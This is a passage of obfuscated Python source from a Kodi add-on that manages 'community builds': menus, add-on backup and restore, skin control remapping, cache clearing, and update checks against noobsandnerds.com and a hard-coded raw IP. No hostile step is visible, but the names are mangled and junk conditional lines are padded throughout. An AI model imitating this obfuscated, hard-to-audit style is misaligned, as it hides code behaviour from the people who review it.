    if localbuildcheck == 'Incomplete' :
     iIiIIi1 ( '' , '[COLOR=lime]Your last restore is not yet completed[/COLOR]' , 'url' , oOO0o0oo0 ( ) , 'noobsandnerds.png' , '' , '' , '' )
     if 78 - 78: Oo + oo0oooooO0 . oOoO0o00OO0
    else :
     iIiIIi1 ( '' , '[COLOR=lime]Current Build Installed: [/COLOR][COLOR=dodgerblue]Local Build (' + localbuildcheck + ')[/COLOR]' , 'noobsandnerds.png' , '' , '' , '' , '' , '' )
  iIiIIi1 ( '' , '[COLOR=orange]---------------------------------------[/COLOR]' , 'None' , '' , 'noobsandnerds.png' , '' , '' , '' )
  if 91 - 91: iIii1I11I1II1 . o0oOOo0O0Ooo . I1ii11iIi11i + OoooooooOO
 if oo00 != '' and o00 != '' and not 'elc' in welcometext :
  iIiIIi1 ( '' , '[COLOR=lime]Unable to login, please check your details[/COLOR]' , 'None' , 'addon_settings' , 'noobsandnerds.png' , '' , '' , '' )
  if 69 - 69: iI1iiIiiII - I1IiiI
 if not 'elc' in welcometext :
  iIiIIi1 ( '' , welcometext , 'None' , 'register' , 'noobsandnerds.png' , '' , '' , '' )
 iIiIIi1 ( '' , '[COLOR=yellow]Settings[/COLOR]' , 'settings' , 'addon_settings' , 'SETTINGS.png' , '' , '' , '' )
 if 95 - 95: I1IiiI * i11iIiiIii . OOo00O0
 if 41 - 41: II111iiii
 if 37 - 37: iii1I11ii1i1 . Oo0Ooo % oOoO0o00OO0 * i1IIi
 if 71 - 71: Oo0Ooo / o0oOOo0O0Ooo + Oo
 if 48 - 48: iI1iiIiiII + oo0oooooO0
 if 16 - 16: iIii1I11I1II1 % i11iIiiIii . OoOoOO00 % OOo00O0 + ooOo . OoO0O00
 if 46 - 46: OoO0O00 - o0oOOo0O0Ooo / OoOoOO00 - OoooooooOO + ooOo
 iIiIIi1 ( 'folder' , 'Install Content' , oooooOoo0ooo , 'install_content' , 'Search_Addons.png' , '' , '' , '' )
 if 58 - 58: o0oOOo0O0Ooo / o0oOOo0O0Ooo + OOo00O0 + iii1I11ii1i1 - OoOoOO00 . Oo
 if i1111 == 'true' :
  iIiIIi1 ( 'folder' , 'Hardware Reviews' , 'none' , 'hardware_root_menu' , 'hardware.png' , '' , '' , '' )
  if 15 - 15: OOo00O0 * OoOoOO00 % oOoO0o00OO0 . OoOoOO00 . iii1I11ii1i1
 if I11 == 'true' :
  iIiIIi1 ( 'folder' , 'Latest News' , 'none' , 'news_root_menu' , 'LatestNews.png' , '' , '' , '' )
  if 97 - 97: ooOo
 if Oo0o0000o0o0 == 'true' :
  iIiIIi1 ( 'folder' , 'Tutorials' , '' , 'tutorial_root_menu' , 'Tutorials.png' , '' , '' , '' )
  if 80 - 80: I1IiiI . OO0oo0oOO
 if i11 == 'true' :
  iIiIIi1 ( 'folder' , 'Maintenance' , 'none' , 'tools' , 'Additional_Tools.png' , '' , '' , '' )
  if 47 - 47: iii1I11ii1i1 + OOo00O0 + II111iiii % i11iIiiIii
  if 93 - 93: I1ii11iIi11i % OoOoOO00 . O0 / oo0oooooO0 * ooOo
def i1iii1ii ( ) :
 II1 = 'defaultskindependecycheck'
 if os . path . exists ( OOoOO0oo0ooO ) :
  shutil . rmtree ( OOoOO0oo0ooO )
  if 27 - 27: OO0oo0oOO + I1IiiI * iIii1I11I1II1 . OoooooooOO * OoOoOO00
 if not os . path . exists ( OOoOO0oo0ooO ) :
  os . makedirs ( OOoOO0oo0ooO )
  if 100 - 100: OoO0O00 / i1IIi - I1IiiI % OO0oo0oOO - iIii1I11I1II1
  if 17 - 17: iii1I11ii1i1 / o0oOOo0O0Ooo % Oo0Ooo
  if 71 - 71: oOoO0o00OO0 . iI1iiIiiII . OoO0O00
 if oOOoo0Oo != 'skin.confluence' :
  Oo0O0O00Oo = os . path . join ( Ooo , oOOoo0Oo , 'addon.xml' )
  I111Ii = open ( Oo0O0O00Oo , mode = 'r' )
  II11 = I111Ii . read ( )
  I111Ii . close ( )
  if 2 - 2: iIii1I11I1II1
  iiii1 = re . compile ( '<requires[\s\S]*?\/requires' ) . findall ( II11 )
  II1 = iiii1 [ 0 ] if ( len ( iiii1 ) > 0 ) else 'None'
  if 66 - 66: ooOo * iIii1I11I1II1 % iIii1I11I1II1 * oOoO0o00OO0 - OOo00O0 - oOoO0o00OO0
 o0O0oO0 = iIIIiIi ( 'http://noobsandnerds.com/TI/AddonPortal/approved.php' )
 if 77 - 77: O0 . OO0oo0oOO
 iiI1IiI . create ( 'Backing Up Add-ons' , '' , 'Please Wait...' )
 if 39 - 39: OOo00O0 . II111iiii
 for ooO in os . listdir ( Ooo ) :
  if 45 - 45: ooOo * OoOoOO00 / iIii1I11I1II1
  if 77 - 77: iI1iiIiiII - iii1I11ii1i1
  if not 'totalinstaller' in ooO and not 'plugin.program.tbs' in ooO and not 'packages' in ooO and os . path . isdir ( os . path . join ( Ooo , ooO ) ) :
   if 11 - 11: I1ii11iIi11i
   if 26 - 26: iIii1I11I1II1 * iI1iiIiiII - Oo
   if ooO in o0O0oO0 and not ooO in II1 and not 'script.' in ooO and not 'repo.' in ooO and not 'repository.' in ooO and os . path . isdir ( os . path . join ( Ooo , ooO ) ) :
    if 27 - 27: I1ii11iIi11i * iI1iiIiiII - OoO0O00 + OO0oo0oOO * OO0oo0oOO
    if 55 - 55: OOo00O0
    if not 'service.xbmc.versioncheck' in ooO and not 'packages' in ooO and os . path . isdir ( os . path . join ( Ooo , ooO ) ) :
     if 82 - 82: iI1iiIiiII - Oo + OoO0O00
     try :
      iiI1IiI . update ( 0 , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % ooO , 'Please Wait...' )
      os . makedirs ( os . path . join ( OOoOO0oo0ooO , ooO ) )
      if 64 - 64: o0oOOo0O0Ooo . O0 * OO0oo0oOO + OoooooooOO - Oo0Ooo . OoooooooOO
      o0OO000ooOo = os . path . join ( OOoOO0oo0ooO , ooO , 'addon.xml' )
      oOo00OooO0oO = os . path . join ( OOoOO0oo0ooO , ooO , 'default.py' )
      O0ooOOO = open ( os . path . join ( Ooo , ooO , 'addon.xml' ) , mode = 'r' )
      O0oiIiiiiI1II1I1 = O0ooOOO . read ( )
      O0ooOOO . close ( )
      if 70 - 70: Oo0Ooo - ooOo . iIii1I11I1II1 % iii1I11ii1i1 / OoOoOO00 - O0
      oo0OoOooo = re . compile ( ' name="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
      O00O00O000OOO = re . compile ( 'provider-name="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
      o0O0oo0o = re . compile ( '<addon[\s\S]*?">' ) . findall ( O0oiIiiiiI1II1I1 )
      II11iI1iiI = re . compile ( '<description[\s\S]*?<\/description>' ) . findall ( O0oiIiiiiI1II1I1 )
      I1i1i1iii = oo0OoOooo [ 0 ] if ( len ( oo0OoOooo ) > 0 ) else 'None'
      o00O0O = O00O00O000OOO [ 0 ] if ( len ( O00O00O000OOO ) > 0 ) else 'Anonymous'
      I1ii = o0O0oo0o [ 0 ] if ( len ( o0O0oo0o ) > 0 ) else 'None'
      I11I = II11iI1iiI [ 0 ] if ( len ( II11iI1iiI ) > 0 ) else 'None'
      if 80 - 80: I1ii11iIi11i / iIii1I11I1II1 % OoOoOO00
      oO000o0Oo00 = '<addon id="' + ooO + '" name="' + I1i1i1iii + '" version="0" provider-name="' + o00O0O + '">'
      i1i1IIii1i1 = '<description>If you\'re seeing this message it means the add-on is still updating, please wait for the update process to complete.</description>'
      if 77 - 77: iIii1I11I1II1 + OoO0O00 . I1ii11iIi11i % OoO0O00
      if I1ii != 'None' :
       i1iiiIii11 = O0oiIiiiiI1II1I1 . replace ( I11I , i1i1IIii1i1 ) . replace ( I1ii , oO000o0Oo00 )
       if 93 - 93: O0
      else :
       i1iiiIii11 = O0oiIiiiiI1II1I1 . replace ( I11I , i1i1IIii1i1 )
       if 85 - 85: i11iIiiIii % i11iIiiIii + O0 / Oo
      O00ooOo = open ( o0OO000ooOo , mode = 'w+' )
      O00ooOo . write ( str ( i1iiiIii11 ) )
      O00ooOo . close ( )
      O0ooOoO = open ( oOo00OooO0oO , mode = 'w+' )
      O0ooOoO . write ( 'import xbmcplugin,xbmcgui,xbmc,xbmcaddon,os,sys\nAddonID="' + ooO + '"\nAddonName="' + I1i1i1iii + '"\ndialog=xbmcgui.Dialog()\nxbmc.executebuiltin("UpdateLocalAddons")\nxbmc.executebuiltin("UpdateAddonRepos")\nchoice=dialog.yesno(AddonName+" Add-on Requires Update","This add-on may still be in the process of the updating so we recommend waiting a few minutes to see if it updates naturally. Alternatively you can try reinstalling, would you like to attempt a reinstall of this add-on?",yeslabel="Install Option 2", nolabel="Wait")\nif choice==1: xbmc.executebuiltin(\'ActivateWindow(10001,"plugin://plugin.program.totalinstaller/?mode=grab_addons&url=%26redirect%26addonid%3d\'+AddonID+\'")\')\nxbmcplugin.endOfDirectory(int(sys.argv[1]))' )
      O0ooOoO . close ( )
      if 89 - 89: OO0oo0oOO % i1IIi % ooOo
     except :
      print "### Failed to backup: " + ooO
      if 53 - 53: ooOo * OoooooooOO . OoOoOO00
      if 96 - 96: I1IiiI % i1IIi . o0oOOo0O0Ooo . O0
   else :
    shutil . copytree ( os . path . join ( Ooo , ooO ) , os . path . join ( OOoOO0oo0ooO , ooO ) )
    if 37 - 37: i1IIi - Oo % OoooooooOO / Oo % OOo00O0
 iiI1IiI . close ( )
 if 48 - 48: i11iIiiIii % ooOo
 i11i11 = "Creating Backup"
 Ii11Iii = "Archiving..."
 ooo00OoOO0o = ""
 oo0O0o = "Please Wait"
 if 13 - 13: iIii1I11I1II1 . OoOoOO00 * I1IiiI / ooOo * OO0oo0oOO
 iIIi1iI1I1IIi ( OOoOO0oo0ooO , O0o0O00Oo0o0 , i11i11 , Ii11Iii , ooo00OoOO0o , oo0O0o , '' , '' )
 if 64 - 64: OOo00O0 / O0 * OoOoOO00 * OOo00O0
 try :
  shutil . rmtree ( OOoOO0oo0ooO )
  if 60 - 60: iii1I11ii1i1 / i1IIi % I1ii11iIi11i / I1ii11iIi11i * I1ii11iIi11i . i11iIiiIii
 except :
  print "### COMMUNITY BUILDS: Failed to remove temp addons folder - manual delete required ###"
  if 99 - 99: OoOoOO00
  if 77 - 77: o0oOOo0O0Ooo
def IIiIi11iiIi ( url ) :
 iiI1IiI . create ( 'Cleaning Temp Paths' , '' , 'Please wait...' )
 if os . path . exists ( OOoOO0oo0ooO ) :
  shutil . rmtree ( OOoOO0oo0ooO )
  if 48 - 48: oOoO0o00OO0 % iii1I11ii1i1
 if not os . path . exists ( OOoOO0oo0ooO ) :
  os . makedirs ( OOoOO0oo0ooO )
  if 3 - 3: oOoO0o00OO0 % OO0oo0oOO + Oo0Ooo
 O0OoOoO00O ( O0o0O00Oo0o0 , OOoOO0oo0ooO )
 if 47 - 47: O0 * I1IiiI * OoO0O00 . II111iiii
 for ooO in os . listdir ( OOoOO0oo0ooO ) :
  if 95 - 95: OO0oo0oOO % oOoO0o00OO0 . O0 % iI1iiIiiII
  if not 'totalinstaller' in ooO and not 'plugin.program.tbs' in ooO :
   if not os . path . exists ( os . path . join ( Ooo , ooO ) ) :
    os . rename ( os . path . join ( OOoOO0oo0ooO , ooO ) , os . path . join ( Ooo , ooO ) )
    iiI1IiI . update ( 0 , "Installing: [COLOR=yellow]" + ooO + '[/COLOR]' , '' , 'Please wait...' )
    print "### Successfully installed: " + ooO
    if 68 - 68: Oo0Ooo . Oo0Ooo - I1ii11iIi11i / iii1I11ii1i1 . OOo00O0 / i1IIi
   else :
    print "### " + ooO + " Already exists on system"
    if 12 - 12: I1ii11iIi11i * i1IIi * iii1I11ii1i1
    if 23 - 23: Oo / O0 / I1IiiI
def I11o0000o0Oo ( welcometext ) :
 ooo0O0OOo0OoO ( 'disclaimer.xml' )
 if oOOoO0 == 'true' :
  iIiIIi1 ( 'folder' , 'I have read and understand the disclaimer.' , welcometext , 'CB_Menu' , 'Community_Builds.png' , '' , '' , '' )
 else :
  iIiIIi1 ( 'folder' , 'I have read and understand the disclaimer.' , 'welcome' , 'CB_Menu' , 'Community_Builds.png' , '' , '' , '' )
  if 45 - 45: O0 / i1IIi * ooOo * OoO0O00
  if 35 - 35: I1ii11iIi11i / oo0oooooO0 % I1IiiI + iIii1I11I1II1
def oO00o ( welcometext ) :
 i11I1IiiiiiiiIi = xbmc . getInfoLabel ( "System.BuildVersion" )
 iIii1I = float ( i11I1IiiiiiiiIi [ : 2 ] )
 Oo0 = int ( iIii1I )
 if 50 - 50: OoOoOO00
 if iI1Ii11111iIi == 'true' :
  if 33 - 33: iii1I11ii1i1
  if i1i1II == 'true' :
   oOo00OoO0O ( 'yes' )
   if 69 - 69: iIii1I11I1II1 * I1IiiI - oo0oooooO0 + O0 + O0
  if i1i1II == 'false' :
   oOo00OoO0O ( 'no' )
   if 65 - 65: iI1iiIiiII / i11iIiiIii / OoO0O00 - Oo
 if not 'elc' in welcometext :
  iIiIIi1 ( '' , '[COLOR=orange]To access community builds you must be logged in[/COLOR]' , 'settings' , 'addon_settings' , 'noobsandnerds.png' , '' , '' , 'Register at [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR]' )
  if 9 - 9: I1IiiI / iI1iiIiiII - Oo0Ooo * iIii1I11I1II1
 if IiII == 'true' :
  iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Show My Private List[/COLOR]' , '&visibility=private' , 'grab_builds' , 'Private_builds.png' , '' , '' , '' )
  if 86 - 86: II111iiii + OOo00O0 + oOoO0o00OO0
 if ( ( oo00 . replace ( '%20' , ' ' ) in welcometext ) and ( 'elc' in welcometext ) ) or ( iI1Ii11111iIi == 'true' ) :
  if 9 - 9: OOo00O0 + II111iiii % OOo00O0 % oOoO0o00OO0 + iIii1I11I1II1
  if ( Oo0 < 14 ) or ( Oo0oO0ooo == 'true' ) :
   iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Show All Gotham Compatible Builds[/COLOR]' , '&xbmc=gotham&visibility=public' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
   if 59 - 59: i1IIi
  if ( Oo0 == 14 ) or ( Oo0oO0ooo == 'true' ) :
   iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Show All Helix Compatible Builds[/COLOR]' , '&xbmc=helix&visibility=public' , 'grab_builds' , 'TRCOMMUNITYHELIXBUILDS.png' , '' , '' , '' )
   if 48 - 48: O0 * OO0oo0oOO * OoO0O00 . OoO0O00 * iii1I11ii1i1 - OO0oo0oOO
  if ( Oo0 == 15 ) or ( Oo0oO0ooo == 'true' ) :
   iIiIIi1 ( 'folder' , '[COLOR=dodgerblue]Show All Isengard Compatible Builds[/COLOR]' , '&xbmc=isengard&visibility=public' , 'grab_builds' , 'TRCOMMUNITYHELIXBUILDS.png' , '' , '' , '' )
   if 14 - 14: I1ii11iIi11i + i11iIiiIii
   if 83 - 83: I1ii11iIi11i / i11iIiiIii + II111iiii . oo0oooooO0 * Oo + oOoO0o00OO0
   if 42 - 42: i1IIi % II111iiii . OOo00O0
  if oo0o0O00 != '' :
   iIiIIi1 ( 'folder' , '[COLOR=darkcyan]Show ' + oO + ' Builds[/COLOR]' , '&id=1' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
  if i1iiIIiiI111 != '' :
   iIiIIi1 ( 'folder' , '[COLOR=darkcyan]Show ' + oooOOOOO + ' Builds[/COLOR]' , '&id=2' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
  if i1iiIII111ii != '' :
   iIiIIi1 ( 'folder' , '[COLOR=darkcyan]Show ' + i1iIIi1 + ' Builds[/COLOR]' , '&id=3' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
  if ii11iIi1I != '' :
   iIiIIi1 ( 'folder' , '[COLOR=darkcyan]Show ' + iI111I11I1I1 + ' Builds[/COLOR]' , '&id=4' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
  if OOooO0OOoo != '' :
   iIiIIi1 ( 'folder' , '[COLOR=darkcyan]Show ' + iIii1 + ' Builds[/COLOR]' , '&id=5' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
 iIiIIi1 ( '' , 'Create My Own Community Build' , 'url' , 'community_backup' , 'Backup.png' , '' , '' , 'Back Up Your Full System' )
 if 7 - 7: I1ii11iIi11i - ooOo * Oo + o0oOOo0O0Ooo . I1ii11iIi11i
 if 85 - 85: O0
def IiiIiI1I1 ( skin ) :
 iI111i11iI1 = '<onleft>%s</onleft>'
 III1ii = '<onright>%s</onright>'
 iI1III1iIi11 = '<onup>%s</onup>'
 i11I1I = '<ondown>%s</ondown>'
 oo0ooooo00o = '<control type="button" id="%s">'
 if 78 - 78: iIii1I11I1II1 . o0oOOo0O0Ooo % iIii1I11I1II1 . O0 / Oo
 if 76 - 76: i1IIi * OoooooooOO * O0 + iI1iiIiiII * iI1iiIiiII
 i1iIiIii = [
 ( '65' , '140' ) ,
 ( '66' , '164' ) ,
 ( '67' , '162' ) ,
 ( '68' , '142' ) ,
 ( '69' , '122' ) ,
 ( '70' , '143' ) ,
 ( '71' , '144' ) ,
 ( '72' , '145' ) ,
 ( '73' , '127' ) ,
 ( '74' , '146' ) ,
 ( '75' , '147' ) ,
 ( '76' , '148' ) ,
 ( '77' , '166' ) ,
 ( '78' , '165' ) ,
 ( '79' , '128' ) ,
 ( '80' , '129' ) ,
 ( '81' , '120' ) ,
 ( '82' , '123' ) ,
 ( '83' , '141' ) ,
 ( '84' , '124' ) ,
 ( '85' , '126' ) ,
 ( '86' , '163' ) ,
 ( '87' , '121' ) ,
 ( '88' , '161' ) ,
 ( '89' , '125' ) ,
 ( '90' , '160' ) ]
 if 20 - 20: o0oOOo0O0Ooo * OOo00O0
 for i1III1iI , ii1ii1IiiiiIi1I in i1iIiIii :
  ooo0O0o0OoOO = open ( skin ) . read ( )
  iIi11i = ooo0O0o0OoOO . replace ( oo0ooooo00o % i1III1iI , oo0ooooo00o % ii1ii1IiiiiIi1I ) . replace ( iI111i11iI1 % i1III1iI , iI111i11iI1 % ii1ii1IiiiiIi1I ) . replace ( III1ii % i1III1iI , III1ii % ii1ii1IiiiiIi1I ) . replace ( iI1III1iIi11 % i1III1iI , iI1III1iIi11 % ii1ii1IiiiiIi1I ) . replace ( i11I1I % i1III1iI , i11I1I % ii1ii1IiiiiIi1I )
  ooOo0O0o0 = open ( skin , mode = 'w' )
  ooOo0O0o0 . write ( iIi11i )
  ooOo0O0o0 . close ( )
  if 98 - 98: OOo00O0 - oo0oooooO0 . iii1I11ii1i1
def Ii1IIIII ( u , skin ) :
 iI111i11iI1 = '<onleft>%s</onleft>'
 III1ii = '<onright>%s</onright>'
 iI1III1iIi11 = '<onup>%s</onup>'
 i11I1I = '<ondown>%s</ondown>'
 oo0ooooo00o = '<control type="button" id="%s">'
 if 49 - 49: iIii1I11I1II1 % II111iiii
 if u < 49 :
  IiiII1iIii111iII = u + 61
  if 27 - 27: o0oOOo0O0Ooo * i11iIiiIii * OoO0O00
 else :
  IiiII1iIii111iII = u + 51
  if 92 - 92: Oo0Ooo / i11iIiiIii + I1ii11iIi11i
 ooo0O0o0OoOO = open ( skin ) . read ( )
 iIi11i = ooo0O0o0OoOO . replace ( iI111i11iI1 % u , iI111i11iI1 % IiiII1iIii111iII ) . replace ( III1ii % u , III1ii % IiiII1iIii111iII ) . replace ( iI1III1iIi11 % u , iI1III1iIi11 % IiiII1iIii111iII ) . replace ( i11I1I % u , i11I1I % IiiII1iIii111iII ) . replace ( oo0ooooo00o % u , oo0ooooo00o % IiiII1iIii111iII )
 ooOo0O0o0 = open ( skin , mode = 'w' )
 ooOo0O0o0 . write ( iIi11i )
 ooOo0O0o0 . close ( )
 if 87 - 87: OoOoOO00 % iIii1I11I1II1
 if 72 - 72: Oo . Oo - I1ii11iIi11i
def III1II1i ( ) :
 iI1i1IiIIIIi = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if 65 - 65: O0 * I1IiiI / I1IiiI . OoOoOO00
 if not os . path . exists ( zip ) :
  O0OoO000O0OO . ok ( 'Download/Storage Path Check' , 'The download location you have stored does not exist .\nPlease update the addon settings and try again.' )
  o0O . openSettings ( sys . argv [ 0 ] )
  if 87 - 87: II111iiii * I1ii11iIi11i % Oo0Ooo * Oo0Ooo
  if 58 - 58: Oo . o0oOOo0O0Ooo + I1IiiI % Oo0Ooo - OoO0O00
def Oo00OO0 ( localbuildcheck , localversioncheck , id ) :
 iIII1I111III = 'http://120.24.252.100/TI/Community_Builds/buildupdate.php?id=%s' % ( id )
 IIo0o0O0O00oOOo = iIIIiIi ( iIII1I111III ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 50 - 50: oo0oooooO0 % II111iiii - OOo00O0 . i1IIi + O0 % oo0oooooO0
 if id != 'None' :
  i1iIi1IIiIII1 = re . compile ( 'version="(.+?)"' ) . findall ( IIo0o0O0O00oOOo )
  i1Ii11I1II = i1iIi1IIiIII1 [ 0 ] if ( len ( i1iIi1IIiIII1 ) > 0 ) else ''
  if 77 - 77: ooOo - Oo0Ooo - iIii1I11I1II1
  if localversioncheck < i1Ii11I1II :
   return True
   if 16 - 16: OoO0O00 / oo0oooooO0 / i1IIi . oo0oooooO0 + ooOo
 else :
  return False
  if 26 - 26: iIii1I11I1II1 + i1IIi / OoOoOO00 % I1ii11iIi11i
  if 44 - 44: OoooooooOO . II111iiii . Oo % OoooooooOO
def oOO0o0oo0 ( ) :
 Oo0oO00 = open ( Ooo0OO0oOO , mode = 'r' )
 O0oiIiiiiI1II1I1 = Oo0oO00 . read ( )
 Oo0oO00 . close ( )
 if 41 - 41: O0 - iii1I11ii1i1 * iIii1I11I1II1
 II111i1ii1iII = re . compile ( 'name="(.+?)"' ) . findall ( O0oiIiiiiI1II1I1 )
 ooo0OoO = II111i1ii1iII [ 0 ] if ( len ( II111i1ii1iII ) > 0 ) else ''
 if 50 - 50: I1IiiI * Oo + OOo00O0
 if ooo0OoO == "Incomplete" :
  i1II = xbmcgui . Dialog ( ) . yesno ( "Finish Restore Process" , 'If you\'re certain the correct skin has now been set click OK' , 'to finish the install process, once complete XBMC/Kodi will' , ' then close. Do you want to finish the install process?' , yeslabel = 'Yes' , nolabel = 'No' )
  if 88 - 88: iii1I11ii1i1 + i11iIiiIii % ooOo * Oo * Oo * OO0oo0oOO
  if i1II == 1 :
   I1I1i ( )
   if 87 - 87: iI1iiIiiII + OOo00O0 + O0 / i1IIi % oOoO0o00OO0 / iI1iiIiiII
  elif i1II == 0 :
   return
   if 64 - 64: OoO0O00 % oOoO0o00OO0 . iI1iiIiiII % OoO0O00 + iii1I11ii1i1 * oOoO0o00OO0
def OOOO00OooO ( ) :
 iI1i1IiIIIIi = xbmc . translatePath ( os . path . join ( zip , 'testCBFolder' ) )
 if 64 - 64: OoO0O00 . I1IiiI - OoooooooOO . OOo00O0 - oo0oooooO0
 try :
  os . makedirs ( iI1i1IiIIIIi )
  os . removedirs ( iI1i1IiIIIIi )
  O0OoO000O0OO . ok ( '[COLOR=lime]SUCCESS[/COLOR]' , 'Great news, the path you chose is writeable.' , 'Some of these builds are rather big, we recommend a minimum of 1GB storage space.' )
  if 77 - 77: OO0oo0oOO % OoOoOO00 / II111iiii % oo0oooooO0 % OoooooooOO % OoO0O00
 except :
  O0OoO000O0OO . ok ( '[COLOR=red]CANNOT WRITE TO PATH[/COLOR]' , 'Kodi cannot write to the path you\'ve chosen. Please click OK in the settings menu to save the path then try again. Some devices give false results, we recommend using a USB stick as the backup path.' )
  if 19 - 19: oOoO0o00OO0 * iI1iiIiiII / ooOo * iI1iiIiiII - OoooooooOO * iii1I11ii1i1
  if 17 - 17: II111iiii + Oo0Ooo . iI1iiIiiII
def I1I1i1i ( data ) :
 data = data . replace ( '</p><p>' , '[CR][CR]' ) . replace ( '&ndash;' , '-' ) . replace ( '&mdash;' , '-' ) . replace ( "\n" , " " ) . replace ( "\r" , " " ) . replace ( "&rsquo;" , "'" ) . replace ( "&rdquo;" , '"' ) . replace ( "</a>" , " " ) . replace ( "&hellip;" , '...' ) . replace ( "&lsquo;" , "'" ) . replace ( "&ldquo;" , '"' )
 data = " " . join ( data . split ( ) )
 OOo0O = re . compile ( r'< script[^<>]*?>.*?< / script >' )
 data = OOo0O . sub ( '' , data )
 OOo0O = re . compile ( r'< style[^<>]*?>.*?< / style >' )
 data = OOo0O . sub ( '' , data )
 OOo0O = re . compile ( r'' )
 data = OOo0O . sub ( '' , data )
 OOo0O = re . compile ( r'<[^<]*?>' )
 data = OOo0O . sub ( '' , data )
 data = data . replace ( '&nbsp;' , ' ' )
 return data
 if 100 - 100: OoO0O00 % OoO0O00
 if 15 - 15: ooOo / iI1iiIiiII
def Iiii111 ( ) :
 i1II = xbmcgui . Dialog ( ) . yesno ( 'Clear All Known Cache?' , 'This will clear all known cache files and can help if you\'re encountering kick-outs during playback as well as other random issues. There is no harm in using this.' , nolabel = 'Cancel' , yeslabel = 'Delete' )
 if 71 - 71: O0 / I1IiiI . iI1iiIiiII / iI1iiIiiII * OOo00O0
 if i1II == 1 :
  OooO0OOo ( )
  OooOoooo0000 ( )
  if 29 - 29: OO0oo0oOO - I1IiiI / I1IiiI * OO0oo0oOO * oOoO0o00OO0 . Oo
  if 80 - 80: iIii1I11I1II1
def i1I11 ( url ) :
 iIiIIi1 ( 'folder' , 'African' , str ( url ) + '&genre=african' , 'grab_builds' , 'african.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Arabic' , str ( url ) + '&genre=arabic' , 'grab_builds' , 'arabic.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Asian' , str ( url ) + '&genre=asian' , 'grab_builds' , 'asian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Australian' , str ( url ) + '&genre=australian' , 'grab_builds' , 'australian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Austrian' , str ( url ) + '&genre=austrian' , 'grab_builds' , 'austrian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Belgian' , str ( url ) + '&genre=belgian' , 'grab_builds' , 'belgian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Brazilian' , str ( url ) + '&genre=brazilian' , 'grab_builds' , 'brazilian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Canadian' , str ( url ) + '&genre=canadian' , 'grab_builds' , 'canadian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Columbian' , str ( url ) + '&genre=columbian' , 'grab_builds' , 'columbian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Czech' , str ( url ) + '&genre=czech' , 'grab_builds' , 'czech.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Danish' , str ( url ) + '&genre=danish' , 'grab_builds' , 'danish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Dominican' , str ( url ) + '&genre=dominican' , 'grab_builds' , 'dominican.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Dutch' , str ( url ) + '&genre=dutch' , 'grab_builds' , 'dutch.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Egyptian' , str ( url ) + '&genre=egyptian' , 'grab_builds' , 'egyptian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Filipino' , str ( url ) + '&genre=filipino' , 'grab_builds' , 'filipino.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Finnish' , str ( url ) + '&genre=finnish' , 'grab_builds' , 'finnish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'French' , str ( url ) + '&genre=french' , 'grab_builds' , 'french.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'German' , str ( url ) + '&genre=german' , 'grab_builds' , 'german.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Greek' , str ( url ) + '&genre=greek' , 'grab_builds' , 'greek.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Hebrew' , str ( url ) + '&genre=hebrew' , 'grab_builds' , 'hebrew.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Hungarian' , str ( url ) + '&genre=hungarian' , 'grab_builds' , 'hungarian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Icelandic' , str ( url ) + '&genre=icelandic' , 'grab_builds' , 'icelandic.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Indian' , str ( url ) + '&genre=indian' , 'grab_builds' , 'indian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Irish' , str ( url ) + '&genre=irish' , 'grab_builds' , 'irish.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Italian' , str ( url ) + '&genre=italian' , 'grab_builds' , 'italian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Japanese' , str ( url ) + '&genre=japanese' , 'grab_builds' , 'japanese.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Korean' , str ( url ) + '&genre=korean' , 'grab_builds' , 'korean.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Lebanese' , str ( url ) + '&genre=lebanese' , 'grab_builds' , 'lebanese.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Mongolian' , str ( url ) + '&genre=mongolian' , 'grab_builds' , 'mongolian.png' , '' , '' , '' )
 iIiIIi1 ( 'folder' , 'Nepali' , str ( url ) + '&genre=nepali' , 'grab_builds' , 'nepali.png' , '' , '' , '' )
